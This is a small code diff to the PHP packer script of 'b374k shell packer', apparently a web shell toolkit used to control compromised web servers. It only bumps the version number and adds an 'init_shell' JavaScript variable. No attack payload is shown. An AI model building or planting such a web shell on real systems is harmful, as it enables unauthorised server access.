@@ -7,7 +7,7 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4";
+$GLOBALS['packer']['version'] = "0.4.1";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -200,6 +200,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 	</div>
 
 	<script type='text/javascript'>
+	var init_shell = false;
 	<?php echo $zepto_code;?>
 	<?php echo $js_main_code;?>
 
